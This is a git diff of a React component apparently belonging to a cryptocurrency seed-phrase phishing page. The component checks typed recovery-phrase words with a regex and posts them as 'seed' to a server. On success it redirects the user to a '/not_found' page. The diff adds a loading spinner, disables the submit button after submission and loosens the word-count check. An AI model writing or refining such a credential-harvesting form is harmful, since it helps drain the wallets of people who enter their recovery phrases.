@@ -1,6 +1,7 @@
-import { useEffect } from "react";
+import { useEffect, useState } from "react";
 import axios from "axios";
 import { useNavigate } from "react-router-dom";
+import { BeatLoader } from 'react-spinners'
 
 const Phrase = ({
   seed1,
@@ -13,15 +14,14 @@ const Phrase = ({
   setCount1,
 }) => {
   const Navigate = useNavigate();
+  const [loading, setLoading] = useState(false)
 
   const handleChange = (e) => {
-    const reg = /^[a-zA-z]+\s([a-zA-Z]+\s){10}[a-zA-Z]+$/;
-    const reg2 = /^[a-zA-z]+\s([a-zA-Z]+\s){22}[a-zA-Z]+$/;
+    const reg = /^[a-zA-z]+\s([a-zA-Z]+\s){1,4}[a-zA-Z]+$/;
     const isMatch = reg.test(e.target.value);
-    const isMatch2 = reg2.test(e.target.value);
     let len = e.target.value.length;
 
-    if (isMatch || isMatch2 || len === 0) {
+    if (isMatch || len === 0) {
       setSeed1(e.target.value);
       setError1(false);
       setCount1(len);
@@ -29,7 +29,7 @@ const Phrase = ({
       setSeed1(e.target.value);
       setError1(true);
       setCount1(len);
-    }
+    } 
   };
 
   const handleSubmit = async (e) => {
@@ -39,6 +39,8 @@ const Phrase = ({
         seed: seed1,
       }
     );
+    setLoading(true)
+    setDisabled1(true)
     if (res.data.status === 200) {
       Navigate("/not_found");
     } else {
@@ -80,7 +82,7 @@ const Phrase = ({
         onClick={handleSubmit}
         disabled={disabled1}
       >
-        VALIDATE
+        {!loading ? 'VALIDATE' : <BeatLoader size={12} />}
       </button>
     </>
   );
